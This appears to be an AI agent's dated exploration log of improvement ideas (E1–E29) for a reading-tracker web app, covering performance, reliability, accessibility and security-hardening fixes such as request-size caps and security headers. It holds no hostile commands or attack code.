# Exploration — new optimization directions

Appended by Agent3 (daily 03:00 CST). Each run adds a dated section.
Strong ideas should also be promoted into `backlog.md` as new OPT-NNN items.

---

## 2026-05-30

### E1 — Global search ignores the quotes tab entirely (S)
**What:** `globalSearch()` in `app.js:1049-1066` calls only `matchBooks()` and passes results to `renderSearchResults()`. The existing `matchQuotes()` helper at `app.js:887` is never invoked from this path. A user who searches for keywords they remember from a quote gets no results unless they switch to the quotes tab and type again in the per-tab search box.

**Why it matters:** Search is a core discovery flow. Silently returning only book results while ignoring an existing, functional quote-search helper is a UX gap that will grow more painful as users accumulate more quotes. The fix is ~10 lines: call `matchQuotes()`, render matched quotes as a second section in `renderSearchResults()`.

**Complexity:** S — `app.js` only; no backend changes needed. `global-search.test.js` would need one new test case.

**Files:** `app.js:877-888, 1017-1066`; `tests/frontend/global-search.test.js`

---

### E2 — `imghdr` is deprecated and removed in Python 3.13 (S)
**What:** `app_server.py` imports `imghdr` (line 8) and uses it at line 1677 (`imghdr.what(None, binary)`) to detect image format when saving uploaded images. Python 3.11 already emits a `DeprecationWarning`; `imghdr` is removed in Python 3.13. A runtime upgrade would cause an `ImportError` crash on the first image upload.

**Why it matters:** The risk is a silent ticking bomb — works today, breaks on upgrade. The fix is a 5-line magic-bytes fallback: PNG starts with `\x89PNG`, JPEG with `\xff\xd8`, WebP with `RIFF...WEBP`. No external dependency needed.

**Complexity:** S — one function (`save_image`, ~5 lines), no schema changes, no test changes required.

**Files:** `app_server.py:8, 1675-1690`

---

### E3 — Static JS/CSS served with `no-store`; ETag/304 would eliminate repeat downloads (S)
**What:** `app.js`, `chat.js`, and `styles.css` are served with `Cache-Control: no-store, no-cache, must-revalidate` (line 2989). On every page load — even a PWA re-open — the browser downloads the full 100KB+ of JS and CSS from scratch. The `/assets/` route already uses `immutable` caching (line 3011); only the main app files are missing this optimization.

**Why it matters:** Mobile users on slow connections experience a noticeable lag on each app open. Adding ETag (SHA-256 of file bytes, computed once at startup) + 304 short-circuit costs ~10 lines of Python and zero risk — the existing `CLIENT_VERSION` / build-version check already ensures stale caches are busted on deploy.

**Complexity:** S — all in the `do_GET` static file handler (`app_server.py:2984-2993`). No frontend changes needed.

**Files:** `app_server.py:2963-2993`

---

### E4 — `link_thought` action missing from backend execution test suite (S)
**What:** `tests/agent/agent_backend_reliability_test.py:334` tests `add_book`, `add_note`, `summary`, `question`, and `tag` actions end-to-end, but `link_thought` (the most complex action in `ActionExecutor`) has no coverage at the execution layer. The executor validates `kind` against a 5-item whitelist, checks source/target types, verifies that referenced IDs exist in state, and can produce three distinct error paths — all untested.

**Why it matters:** `link_thought` is the only agent action that touches the `connections` part of state, and its validation has four independent guard clauses. Any regression there is invisible to CI.

**Complexity:** S — add one test method to `agent_backend_reliability_test.py` that seeds a book + quote, invokes `link_thought` via the `/api/chat` + approve flow, and asserts the connection appears in state.

**Files:** `tests/agent/agent_backend_reliability_test.py`; `app_server.py:2631-2661`

---

### E5 — `renderQuotes()` rebuilds full DOM on every keystroke with no debounce (S)
**What:** The quote search input fires `renderQuotes()` on every `input` event (line 3575). `renderQuotes()` rebuilds the entire `els.quotesList.innerHTML` synchronously — for a user with 200+ quotes this is a full DOM rebuild on every character typed. `renderBooks()` uses a `requestAnimationFrame` batching strategy (line 1100-1117) but `renderQuotes()` does not.

**Why it matters:** Mobile browsers have limited JS execution budgets. A 300ms debounce on the search input + the same rAF-batched render pattern already used by `renderBooks()` would eliminate jank on the quotes tab for power users with large collections.

**Complexity:** S — add a `debounce()` wrapper at the event listener (line 3575) and optionally batch quote card appends the same way `renderBooks()` does.

**Files:** `app.js:3575, 1189-1253`

---

### E6 — Rate-limit headroom never surfaced to user before the 429 wall (M)
**What:** `check_and_record_rate_limit()` returns `hour_count`, `hour_limit`, `day_count`, `day_limit` on every successful request (line 1092-1130), but the chat endpoints never forward this to the client. Users discover they've hit the limit only when a request fails with a 429; there is no prior warning. The streaming chat handler (`/api/chat/stream`) sends an initial JSON header chunk before streaming begins — it could include `{"remaining": {"hour": N, "day": M}}` there.

**Why it matters:** Surprise 429s erode trust. A one-line addition to the pre-stream JSON header (sent unconditionally, zero latency cost) would let `chat.js` show "今日剩余 2 次" before the last request fires. The backend already has all the data.

**Complexity:** M — backend change to the stream header (~5 lines); `chat.js` needs to parse the header chunk and update a UI counter; one new JS test.

**Files:** `app_server.py` (stream handler ~line 3979); `chat.js` (~line 587); `tests/frontend/chat-agent-approval.test.js`

---

## 2026-05-30 (pass 2)

### E7 — Custom quote tags stored only in localStorage — not synced across devices (M)
**What:** `getCustomQuoteTags()` and `saveCustomQuoteTags()` at `app.js:405-409` use `localStorage["quote-custom-tags"]` as the sole store for user-defined tag vocabulary. `sanitize_state()` in `app_server.py:565-599` has no `customQuoteTags` field; `INITIAL_STATE` at line 148-155 also omits it. A user who creates a custom tag on their phone and opens the app on a desktop browser finds an empty tag picker.

**Why it matters:** Tags are a first-class organizational primitive. Custom tags built up over time (book genres, personal reading goals) are invisible on any second device, and lost entirely if localStorage is cleared. The fix is to add `customQuoteTags` to `sanitize_state()` + `INITIAL_STATE`, persist it on save, and read from server state on load rather than from localStorage.

**Complexity:** M — backend: add field to `sanitize_state()` and `INITIAL_STATE` (~5 lines); frontend: replace `getCustomQuoteTags()`/`saveCustomQuoteTags()` to read from `state.customQuoteTags` and issue a state-save on change; one-time migration merges existing localStorage tags into first sync.

**Files:** `app_server.py:148-155, 565-599`; `app.js:405-410, 659` (state save path)

---

### E8 — `json.loads()` in `summarize_metrics()` has no error handling — one corrupted row crashes the whole metrics endpoint (S)
**What:** `MetricsCollector.summarize_metrics()` at `app_server.py:2427` calls `json.loads(row["dimensions"])` inside a loop over all metric rows with no try-except. The `dimensions` column is written by `record_metric()` — if any row has truncated JSON (e.g., from a mid-write crash or a schema migration), the entire call raises `json.JSONDecodeError` and the `/debug/metrics` and `/debug/logs` endpoints return 500.

**Why it matters:** One bad row in `agent_metrics` breaks the metrics dashboard for that user permanently until manual DB surgery. The fix is a two-line try-except that skips the bad row and continues.

**Complexity:** S — wrap the `json.loads` call at line 2427 in `try/except json.JSONDecodeError`, log a warning, and `continue`.

**Files:** `app_server.py:2401-2435` (`MetricsCollector.summarize_metrics`)

---

### E9 — `_read_json()` reads the full request body with no size cap — DoS via oversized payload (M)
**What:** `_read_json()` at `app_server.py:2899-2902` reads `content_length = int(self.headers.get("Content-Length", "0"))` and then calls `self.rfile.read(content_length)` with no upper bound. All POST endpoints that accept JSON (including `/api/upload-image` and `/api/quotes/ocr` which receive base64-encoded images) allocate however many bytes the caller claims. An unauthenticated attacker — or one who passes the rate-limit check on the first request — can send a `Content-Length: 2000000000` header and force the process to block reading and allocate gigabytes.

**Why it matters:** The server is a single-process `ThreadingHTTPServer` with no reverse proxy in the default dev setup. One malicious request can starve all other users. Adding a `MAX_REQUEST_BYTES` constant (~20 MB) and a 413 rejection before the read costs three lines.

**Complexity:** M — add constant `MAX_REQUEST_BYTES = 20 * 1024 * 1024`; in `_read_json()` reject with 413 if `content_length > MAX_REQUEST_BYTES`; add the same check in the Stripe webhook raw-body read at line 3676-3677.

**Files:** `app_server.py:2899-2902` (`_read_json`), `app_server.py:3676-3677` (webhook handler)

---

### E10 — Export exists but there is no import endpoint — backups are unrestorable (M)
**What:** `GET /api/account/export` at `app_server.py:3129-3188` produces a complete JSON dump of user state, model logs, agent traces, and uploaded file metadata. There is no corresponding `POST /api/account/import` endpoint. The export JSON even includes an `exportFormat: 1` version field, signalling intent for a future importer — but that importer was never built.

**Why it matters:** Users who export their data for backup, account migration, or GDPR reasons cannot restore it. The export file is therefore a dead artefact. For a SaaS product with a "data export" compliance feature, the absence of restore makes the export promise hollow.

**Complexity:** M — add `POST /api/account/import` that: (1) reads the export JSON; (2) validates `exportFormat == 1`; (3) passes `payload["state"]` through `sanitize_state()`; (4) calls `save_state()`. No image files are restored (note that in the export body); document this clearly. Add one integration test.

**Files:** `app_server.py` (new handler near line 3129); `tests/agent/account_export_delete_test.py`

---

## 2026-05-31

### E11 — Four GC functions defined but never called — DB grows forever (S)
**What:** `gc_expired_sessions()`, `gc_expired_password_reset_tokens()`, `gc_old_server_errors()`, and `gc_old_rate_limit_rows()` are all fully implemented in `app_server.py` (lines 1019, 1485, 1495, 1503) and are tested individually in `session_expiry_test.py`, `server_errors_test.py`, and `rate_limit_test.py`. None of them are called anywhere outside those tests — not at startup, not on a timer, not on any request. Every expired session row, every used/expired password reset token, every server error older than 30 days, and every stale rate-limit counter window persists in the DB forever. The `main()` function at line 4631 only calls `init_db()` and `serve_forever()`.

**Why it matters:** On a live deployment this is a slow leak. Rate-limit counters alone create two rows per user per active hour/day window; after a year of moderate use the table will have tens of thousands of orphan rows, degrading the `BEGIN IMMEDIATE` lock contention in `check_and_record_rate_limit()`. Sessions never expire from the DB even though `SESSION_LIFETIME_DAYS` is enforced at the query level, wasting storage. The fix is trivial: add a background thread (or a per-request probabilistic trigger) that calls all four GC functions with a fresh connection. No schema changes, no new logic.

**Complexity:** S — one new helper `_run_gc()` that calls all four GC functions, invoked as a daemon thread at startup (every 6 hours). Five lines of new code.

**Files:** `app_server.py:1019, 1485, 1495, 1503, 4631-4638`

---

### E12 — HTML responses served with no security headers (S)
**What:** The `_STATIC` handler in `do_GET()` (line 2995-3005) serves `landing.html`, `index.html`, `privacy.html`, and `terms.html` with only `Content-Type` and `Cache-Control` headers. There are no `X-Frame-Options`, `X-Content-Type-Options`, `Content-Security-Policy`, or `Referrer-Policy` headers. The JSON API sends `Access-Control-Allow-Origin: *` on every endpoint (lines 2883, 2894, 2905, 2965), including authenticated ones.

**Why it matters:** Without `X-Frame-Options: SAMEORIGIN`, the app pages can be embedded as iframes for clickjacking attacks. Without `X-Content-Type-Options: nosniff`, older browsers can MIME-sniff responses. For a commercial app handling user reading data and payment flows, these headers are baseline hygiene expected by any security scanner. The fix is 4-5 header lines added to the static-file response block and one helper method that emits them consistently.

**Complexity:** S — add `_send_security_headers()` helper; call it in `do_GET()` for HTML responses. Touch: `app_server.py:2995-3005`.

**Files:** `app_server.py:2890-2909, 2995-3005`

---

### E13 — Static files read from disk on every HTTP request (S)
**What:** The `_STATIC` dict in `do_GET()` at line 2983 is rebuilt as a local variable on every request, and each file is read fresh with `(BASE_DIR / filename).read_bytes()` (line 2997) on every hit — no in-memory cache. `app.js` (~115 KB), `styles.css` (~100 KB), and `landing.html` change only on deploy. On a busy server serving the PWA to mobile users, this means repeated disk I/O for large files that never change at runtime.

**Why it matters:** Moving the preload to module-level startup (read once, store bytes in a dict) eliminates all per-request disk reads for static files. Combined with the E3 ETag/304 optimization (already in explore.md but not yet backlogged), this halves the work for cache-hit requests too. The change is safe: `serve_forever()` in a `ThreadingHTTPServer` has no file-watch mechanism; files would only refresh on server restart anyway.

**Complexity:** S — preload `_STATIC_CACHE: dict[str, bytes]` at module level or in `main()` before `serve_forever()`. Swap `content = (BASE_DIR / filename).read_bytes()` to a dict lookup. Touch: `app_server.py:2983-3005`.

**Files:** `app_server.py:2983-3005`

---

### E14 — `renderTimeline` and `renderConnections` also fire on every keystroke without debounce (S)
**What:** `els.sessionSearch.addEventListener("input", renderTimeline)` at `app.js:3575` and `els.connectionSearch.addEventListener("input", renderConnections)` at `app.js:3420` both trigger their respective full DOM rebuild on every character typed. `renderQuotes()` was flagged in E5 for the same pattern. All three search inputs share the same anti-pattern: no debounce wrapper, no `requestAnimationFrame` batching. The session timeline iterates all sessions and quotes; the connections panel iterates all connections with two-sided label resolution.

**Why it matters:** Users with many sessions or connections experience keystroke lag, especially on low-end mobile browsers. A 200ms debounce (the same fix proposed for `renderQuotes` in E5) applied consistently to all three search inputs would eliminate the jank at negligible implementation cost.

**Complexity:** S — define a single `debounce(fn, ms)` utility in `app.js`, wrap all three search-input event listeners. Touch: `app.js:3420, 3575-3576`. (E5 already covers `renderQuotes`; this item covers the two missed cases.)

**Files:** `app.js:3420, 3575-3576, 610, 1122`

---

### E15 — `model_logs` and `agent_metrics` tables have no row cap — unbounded growth for active users (M)
**What:** `model_logs` is written on every LLM/OCR call (line 1534); `agent_metrics`, `agent_traces`, `agent_trace_events`, and `agent_actions` are written on every agent pipeline run (lines 2221, 2234, 2319, 2472). None have a per-user row cap or a time-based pruning job. The GC functions (`gc_old_server_errors`, `gc_old_rate_limit_rows`) exist for the auxiliary tables but not for the primary observability tables. A Plus user who makes the full daily 240 chat requests × 365 days accumulates 87,600 `model_logs` rows, each containing the full system prompt (1–3 KB) — around 200 MB per year, per heavy user, in a single `state_json`-adjacent SQLite file.

**Why it matters:** SQLite performance degrades as tables grow past tens of thousands of rows when queries scan without covering indexes. `list_logs()` already caps the query at `LIMIT 30`/`100`, so query results stay fast — but the table scan to reach `ORDER BY created_at DESC LIMIT 30` still touches all rows unless the index is used. A simple `gc_old_model_logs(keep_days=90)` function (delete rows older than 90 days, keep last 500 per user) would cap growth without data loss for the debugging use case.

**Complexity:** M — add `gc_old_model_logs()` and `gc_old_agent_data()` functions; add them to the `_run_gc()` call proposed in E11. Verify that `list_logs()` and `summarize_metrics()` indexes survive. Touch: `app_server.py:1562-1577` (check indexes), new GC functions near line 1503.

**Files:** `app_server.py:332-399, 1495-1513, 1534-1560`

---

## 2026-06-01

### E16 — `call_deepseek()` has zero retry logic; transient 429/502 silently fails three critical paths (S)
**What:** `call_kimi_vision()` has `KIMI_VISION_MAX_ATTEMPTS = 2` with retry on HTTP 503 and timeout (lines 2794, 2835, 2842). The plain `call_deepseek()` at line 2703 does the opposite: any `HTTPError` or `URLError` raises immediately. This function is used in three production paths: (a) the non-streaming fallback when `stream_finish_reason != "stop"` (line 4101); (b) the OCR DeepSeek fallback after Kimi vision fails (line 1821); (c) chat history compression at line 1826. DeepSeek's API returns transient 429s under load and occasional 502s. In all three cases, the caller catches `RuntimeError` and surfaces a user-facing error with no retry.

**Why it matters:** History compression failing silently already degrades context quality; the streaming fallback path is hit on roughly every long LLM response. A single exponential-backoff retry (max 2 attempts, 1s delay) with a `_is_retryable_http_error(code)` check (codes 429, 500, 502, 503) eliminates most transient failures at negligible latency cost for the happy path.

**Complexity:** S — add a `_retryable_deepseek_call(messages, model, max_tokens, attempts=2)` wrapper or extend `call_deepseek()` with a `retries` param; replicate the retry pattern from `call_kimi_vision()` at lines 2835-2850. Touch: `app_server.py:2703-2731`.

**Files:** `app_server.py:2703-2731, 2780-2854` (retry pattern reference), callers at lines 1821, 1826, 4101

---

### E17 — Buttons have no `:focus-visible` style — keyboard users get zero focus indicator (S)
**What:** `styles.css` sets `outline: none` for `input:focus`, `select:focus`, `textarea:focus` (line 533) and provides a `box-shadow` focus ring for those elements. But no `:focus` or `:focus-visible` rule exists for any button selector: `.circle-action`, `.icon-btn`, `.tag-chip-pick`, `.filter-chip`, `.me-list-btn`, `.book-card`, or the generic `button`. Keyboard users tabbing through the app see the browser's default blue outline suppressed by global `* { box-sizing: border-box }` inheritance, or nothing at all. Zero occurrences of `:focus-visible` in the 3451-line stylesheet.

**Why it matters:** WCAG 2.1 SC 2.4.7 (Focus Visible, Level AA) requires that any keyboard-operable UI component has a visible focus indicator. The app has 30+ interactive buttons in the main UI, including the critical chat submit, book-add, and action-approve buttons. A fix is a three-line CSS addition; it's a baseline accessibility gap for a commercial product.

**Complexity:** S — add a single CSS rule: `button:focus-visible, [role="button"]:focus-visible { outline: 2px solid var(--color-ink); outline-offset: 2px; }`. No HTML changes required. Touch: `styles.css` (after line 540).

**Files:** `styles.css:533-540` (input focus block — add sibling rule); impacts all button types in `index.html`

---

### E18 — `estimate_tokens()` underestimates Chinese text by 2–3× — debug dashboard costs are wrong (S)
**What:** `estimate_tokens()` at line 300 returns `len(text) // 4`. This heuristic is calibrated for English (average ~4 chars/token). Chinese content tokenizes at roughly 1.5–2 characters per token in DeepSeek's tokenizer (BPE over UTF-8 bytes, where each CJK character encodes to 3 bytes). A 600-character Chinese message (`len = 600`) returns `estimate_tokens = 150`, but the actual token count is ~400. All `model_logs` input/output token fields and the `agent_metrics` summaries on `/debug/logs` use this estimate. Users monitoring cost or quota burn see numbers that are ~60% too low.

**Why it matters:** The debug dashboard (OPT-005, now done) surfaces per-request token stats. Those stats are systematically misleading for Chinese content. A simple fix: detect CJK character ratio (count chars in `一-鿿` range), branch on `len(text.encode("utf-8")) // 4` for high-CJK strings, fallback to `len(text) // 4` for Latin. This doesn't require a real tokenizer and brings estimates within ~15% of actual.

**Complexity:** S — replace the one-liner with a 5-line function: count CJK characters, if ratio > 0.4 use UTF-8 byte length ÷ 4, else character length ÷ 4. No schema changes, no interface changes. Touch: `app_server.py:300-302`.

**Files:** `app_server.py:300-302`; affects all callers at lines 920, 934, 4106, 4107, 4218, 4300, 4301, 4416

---

### E19 — No logged-in password change endpoint; only email-based reset available (S)
**What:** The account settings drawer (line 231 in `index.html`) only exposes email update. The backend's only password-mutation route is the two-step `POST /api/password/reset-request` + `POST /api/password/reset` email flow (lines 3567, 3634). There is no `POST /api/account/password` endpoint that accepts `{currentPassword, newPassword}` for an already-authenticated user. This means a user who wants to change their password must trigger a forgot-password email even though they're already signed in — a standard UX antipattern.

**Why it matters:** Password change for authenticated users is a baseline security feature expected in any account-bearing app. The absence forces users through a broken trust loop (am I actually logged in?) and fails users without verified email. Implementation is simple: verify current password via `verify_password()`, enforce `len(new) >= 4`, update `password_hash`.

**Complexity:** S — add `POST /api/account/password` handler (near line 3543): read `{currentPassword, newPassword}`, call `verify_password(user["password_hash"], currentPassword)`, reject with 400 if wrong, `UPDATE users SET password_hash = ?`. Front-end: add one form to the account drawer (4 lines of HTML + 10 lines of JS). Touch: `app_server.py` (~3543), `index.html` (account drawer ~line 231), `app.js` (~15 lines).

**Files:** `app_server.py` (new handler near line 3543); `index.html:231-310` (account drawer); `app.js` (~line 1619 logout area)

---

### E20 — `compress_chat_history_if_needed()` has no tests: silent fallback and state-save side-effects uncovered (S)
**What:** `compress_chat_history_if_needed()` at line 1808 has three distinct code paths: (a) history is short enough → return unchanged; (b) LLM call succeeds → splice compressed summary + recent messages, save state; (c) `except Exception: compressed = recent` → silently swallow compression failure and return recent-only history. None of these paths have test coverage. The function is called on two hot paths (line 4052 in streaming handler, line 4288 in non-streaming handler), makes a real `call_deepseek()` invocation, and writes back to SQLite via `save_state()`. A regression in path (b) or (c) would silently corrupt or truncate chat history without any CI signal.

**Why it matters:** Compression is triggered on the most engaged users (those with > 10 messages per chat context). A bug there is invisible but high-impact: affected users would lose context suddenly. Adding tests for the compression threshold, the successful compression path, and the fallback path costs ~30 lines of test code and would catch the class of silent-corruption regressions.

**Complexity:** S — add one test class to a new or existing test file with three methods: `test_short_history_returned_unchanged`, `test_compression_triggered_when_above_threshold` (mock `call_deepseek`, assert summary splice), `test_fallback_on_llm_error` (mock `call_deepseek` to raise, assert recent-only returned). Touch: `tests/agent/` (new test file), `app_server.py:1808-1836` (no changes needed).

**Files:** `app_server.py:1804-1836` (`_COMPRESS_THRESHOLD`, `compress_chat_history_if_needed`); `tests/agent/` (new test file)

---

### E21 — App ships with no `prefers-color-scheme: dark` support; reading at night forces bright white screen (M)
**What:** `styles.css` defines all colours via CSS custom properties in `:root` (e.g., `--color-bg`, `--color-surface`, `--color-ink`) but there is no `@media (prefers-color-scheme: dark)` block anywhere in the 3451-line file. System dark mode (iOS 13+, Android 10+) is ignored; users who enable dark mode on their phone open the app to a bright white reading interface at night. The landing page, app shell, chat panel, and all dialogs stay full-brightness regardless.

**Why it matters:** This is a reading app with a strong night-time use case. The CSS variable architecture is already dark-mode ready — the entire dark theme is adding a `@media (prefers-color-scheme: dark)` block that redefines ~10 root variables (`--color-bg → #1a1a1a`, `--color-surface → #242424`, `--color-ink → #e8e8e8`, etc.). No component changes needed; the variables propagate automatically. This is the highest visual-polish gap visible on the first daily use by any new mobile user.

**Complexity:** M — define a dark-mode variable block (~15 lines) and audit contrast ratios for the ~8 semantic colour variables; verify that image overlays, chat bubbles, and tag chips all remain readable. May need minor per-component overrides. Touch: `styles.css` (new `@media` block near top, plus targeted overrides).

**Files:** `styles.css` (CSS vars at top, targeted overrides for `.chat-bubble`, `.tag-chip`, `.book-card`, `.me-drawer`)

---

## 2026-06-02

### E22 — `model_logs` and `agent_traces` have no `user_id` index — debug dashboard does full table scans (S)
**What:** `init_db()` creates five user-content tables but only defines indexes for `rate_limit_counters(updated_at)`, `server_errors(created_at)`, `password_reset_tokens(user_id)`, and `payments(user_id, subscription_id)`. `model_logs`, `agent_traces`, `agent_actions`, and `agent_metrics` have no secondary indexes at all. `list_logs()` (`app_server.py:1810-1875`) queries `WHERE model_logs.user_id = ? ORDER BY model_logs.created_at DESC LIMIT 30` — a full table scan over every row from every user. The `/debug/logs` debug dashboard and the metrics aggregation in `summarize_metrics()` both hit these unindexed paths on every load.

**Why it matters:** As OPT-005 (now done) made the debug dashboard actively used, and OPT-016 drives more OCR calls into `model_logs`, the table grows continuously. For a Plus user making 240 calls/day, `model_logs` reaches 87,000+ rows/year. The `list_logs` query's cost scales linearly with total row count across all users — the dashboard that was instant at 1,000 rows becomes noticeably slow at 50,000. Adding three covering indexes eliminates the full scan entirely and is a zero-risk, zero-schema-change improvement.

**Complexity:** S — add three `CREATE INDEX IF NOT EXISTS` lines to `init_db()` (the `executescript` block at line 341): `idx_model_logs_user_created ON model_logs(user_id, created_at)`, `idx_agent_traces_user_created ON agent_traces(user_id, created_at)`, `idx_agent_actions_trace ON agent_actions(trace_id)`. SQLite creates the indexes on next startup; existing data is automatically indexed.

**Files:** `app_server.py:337-490` (init_db executescript block)

---

### E23 — `resolve_user_from_token` issues a DB write on every authenticated request — unnecessary write churn on read-heavy workload (S)
**What:** `resolve_user_from_token()` at `app_server.py:1262` unconditionally issues `UPDATE sessions SET last_seen_at = ? WHERE token = ?` on every call, even for purely read-only requests (`GET /api/session`, `GET /api/model-logs`, `GET /api/account/plan`). The mobile PWA calls `/api/session` on every app open and each tab-focus event, triggering a write per open. With multiple browser tabs or a polling debug dashboard, this creates a steady write-lock storm on the SQLite file — even idle browse sessions hold a write lock momentarily on every GET.

**Why it matters:** SQLite serialises writes with `BEGIN IMMEDIATE`; each `last_seen_at` update briefly blocks all concurrent readers including the `/api/chat/stream` SSE connections that must not stall. A threshold-based update (write only if `time.time() - last_seen_epoch > 300`) reduces write frequency by ~10–20× for an active user without changing session-expiry semantics (the read path still checks the staleness against `SESSION_LIFETIME_DAYS`).

**Complexity:** S — in `resolve_user_from_token()` at line 1256–1263, add: `if time.time() - last_seen_epoch > 300:` before the `conn.execute("UPDATE sessions …")` call. Two-line change, no schema changes, no tests need updating.

**Files:** `app_server.py:1241-1264` (`resolve_user_from_token`)

---

### E24 — Streaming chat fetch has no AbortController timeout — server hang or silent network drop freezes the UI indefinitely (M) — ✅ DONE (commit c5c4281)
**已实现，勿再提拔为 OPT 项。** `chat.js` 已加 `AbortController` + 30s idle timeout（`STREAM_IDLE_TIMEOUT_MS`，`chat.js:5,606-611`），计时器在 `await fetch` 前就 arm（覆盖 header 阶段的 iOS 切网半关闭）、每个 delta 重置、`finally` 清理；`AbortError` 渲染「请求超时，请重试」+ 内联重试按钮（`renderStreamTimeout`）。测试：`tests/frontend/chat-agent-approval.test.js:556`（fake timer 快进 30s）。

**What:** `_doStreamAndFinalize()` in `chat.js:572-680` opens a streaming `fetch()` to `/api/chat/stream` with no `signal` attached. The inner `reader.read()` loop at line 622 stalls indefinitely if the connection goes silent — which happens regularly on iPhone when LTE/WiFi transitions occur mid-stream (the OS half-closes the TCP connection without sending an EOF). The user sees the "thinking" animation for potentially 5+ minutes until the OS TCP keepalive finally triggers a RST. The existing `recoverCompletedChatAfterLoadError` at line 526 only fires on an explicit JS exception, not on a stalled-but-open reader.

**Why it matters:** Mobile reading sessions frequently happen in transit (commute, bed, café). A 5-minute frozen UI with no "retry" affordance erodes user trust and burns battery. The fix requires ~15 lines: create an `AbortController`, pass its `signal` to `fetch()`, and reset a 30-second inactivity `setTimeout` on each received `delta` chunk. Catch `AbortError` and render "请求超时，请重试" with a retry button.

**Complexity:** M — changes in `chat.js:572-680` only. Needs one new test case in `tests/frontend/chat-agent-approval.test.js` asserting that an abort mid-stream renders the timeout message.

**Files:** `chat.js:572-680`; `tests/frontend/chat-agent-approval.test.js`

---

### E25 — CSS transitions and infinite animation lack `prefers-reduced-motion` guard — WCAG Level A violation (S)
**What:** `styles.css` applies CSS `transition` on 8+ selectors (lines 356, 552, 1058, 1848, 1974, 2180, 2553, 2729, 3440) and defines an infinite `@keyframes chat-dot-pulse` animation (line 1878) used in `.chat-bubble-loading`. There is no `@media (prefers-reduced-motion: reduce)` block anywhere in the 3,451-line stylesheet. Users with iOS "Reduce Motion" or Android "Remove animations" enabled receive the full set of transitions and the indefinitely-looping loading animation.

**Why it matters:** WCAG 2.1 SC 2.2.2 (Pause, Stop, Hide — Level A) is violated by the infinite `chat-dot-pulse` animation: it plays for the entire duration of an AI response (5–30 s) with no way for the user to pause it. SC 2.3.3 (Animation from Interactions — Level AAA) covers the decorative transitions. Level A is a baseline commercial requirement; the fix is a single 4-line CSS block. It also benefits users on low-end devices where GPU-accelerated transitions can cause jank.

**Complexity:** S — add one `@media (prefers-reduced-motion: reduce)` block near the top of `styles.css` (after the `:root` vars, before line 356): `*, *::before, *::after { animation-duration: 0.01ms !important; transition-duration: 0.01ms !important; }`. No HTML or JS changes.

**Files:** `styles.css:350-360` (add block after CSS vars section); primary impact: `styles.css:1875-1885` (chat-dot animation)

---

### E26 — Handler methods acquire `conn` but close it manually without `try/finally` — exceptions after `_require_user()` leak the connection (M)
**What:** All 40+ route branches in `do_GET()`, `do_POST()`, `do_PUT()`, `do_DELETE()` follow the pattern: acquire via `conn, user = self._require_user()` then close manually at each exit point with `conn.close()`. If any unexpected exception is raised between these two points — for example an unhandled `KeyError` when processing a malformed-but-valid-JSON request body, or a `TypeError` inside a helper — the connection is never closed. Python's `sqlite3.Connection` objects are not reliably collected on exception; they remain open until the next GC cycle (or indefinitely in CPython with reference cycles).

**Why it matters:** Each leaked connection holds a shared-cache lock on the SQLite file. Under sustained load with occasional edge-case exceptions, leaked connections accumulate and can cause `sqlite3.OperationalError: database is locked` for other concurrent requests. The correct fix is to wrap handler bodies in `with get_conn() as conn:` or use `try/finally` — but touching 40+ branches is a medium refactor. A lower-effort intermediate fix is to wrap the outermost `_require_user` in a context manager that guarantees `conn.close()` on exit regardless of exception.

**Complexity:** M — introduce a `_require_user_ctx()` context manager (or add `try/finally` wrapping to the 5 main handler bodies). Touch: `app_server.py:3195-3202` + all handlers.

**Files:** `app_server.py:3195-3202` (`_require_user`); `app_server.py:3243-4993` (all four handler methods)

---

## 2026-06-03

### E27 — No Web App Manifest — Android/standard Chrome users cannot install the app (S)
**What:** `index.html` has Apple-specific PWA meta tags (`apple-mobile-web-app-capable`, `apple-mobile-web-app-title`) but no `<link rel="manifest">` and no `manifest.json`. The Web App Manifest is the standard cross-platform mechanism for installable PWAs; without it, Android Chrome's "Add to Home Screen" banner never fires, and the installed experience has no defined `start_url`, `display: standalone`, or branded `theme_color`. The Apple-only path already works, but Android and desktop Chrome users are left out.

**Why it matters:** The app is designed as a mobile-first reading tracker — install friction directly affects daily active use. Adding a manifest is a 15-line JSON file plus one `<link>` tag. The existing `apple-touch-icon.png` asset can be reused as the PWA icon. Serving the manifest through the existing `_STATIC` dict requires one extra entry.

**Complexity:** S — create `manifest.json` (~15 lines) with `name`, `short_name`, `start_url`, `display: standalone`, `theme_color`, `background_color`, `icons`; add `<link rel="manifest" href="/manifest.json">` to `index.html` and `landing.html`; add `"/manifest.json"` to `_STATIC` in `app_server.py:3404-3415`.

**Files:** new `manifest.json`; `index.html:5-12` (meta head block); `landing.html` (head block); `app_server.py:3404-3415` (_STATIC dict)

---

### E28 — Toast notification lacks `aria-live` — screen reader users never hear transient feedback (S)
**What:** `#toast` at `index.html:620` is a `<div class="toast">` with no `role` or `aria-live` attribute. `showToast()` in `app.js:395-408` updates `textContent` and toggles a CSS class to show/hide it. Screen readers only announce dynamic content changes when the element has `aria-live="polite"` (or `role="status"`, which implies it). Messages like "登录已过期，请重新登录", "注册成功，已自动登录", and validation errors (line 1546-1558) are completely invisible to assistive technology. WCAG 2.1 SC 4.1.3 (Status Messages, Level AA) requires that status messages be programmatically determinable without receiving focus.

**Why it matters:** Toast is the primary feedback channel for all form submissions, auth events, and error states. For a commercial product, failing WCAG 4.1.3 AA on the single most-used feedback element is a baseline compliance gap. The fix is one HTML attribute addition with zero JS changes — `role="status"` on `#toast` implies `aria-live="polite"` and `aria-atomic="true"` automatically.

**Complexity:** S — add `role="status" aria-atomic="true"` to the `<div id="toast">` element at `index.html:620`. No JS or CSS changes needed.

**Files:** `index.html:620`

---

### E29 — `PromptBuilder` injects `existing_connections[:20]` into every chat request — irrelevant for 80%+ of chats (S)
**What:** `PromptBuilder.build_chat_prompt()` at `app_server.py:2241` always includes `"existing_connections": user_state.get("connections", [])[:20]` in the system prompt payload, regardless of chat context. The system instruction for book-scoped and quote-scoped chats (lines 2270-2275) explicitly says to return `link_thought` **only when the user explicitly asks** for cross-book associations — meaning the connection list is injected as mandatory context into requests where it is never supposed to be used. A user with 50 connections accumulates ~150 tokens of connection noise per request. At 240 chat requests/day for a Plus user, that's 36,000 wasted context tokens per day.

**Why it matters:** Reducing prompt token waste lowers per-user API costs directly. The fix is conditional: skip `existing_connections` (or set it to `[]`) when the context is `"book"` or `"quote"` — the two cases where the system instruction already prohibits connection usage. Only the `"global"` context and explicit link intents need it. Two-line change with zero behavior impact for the common case.

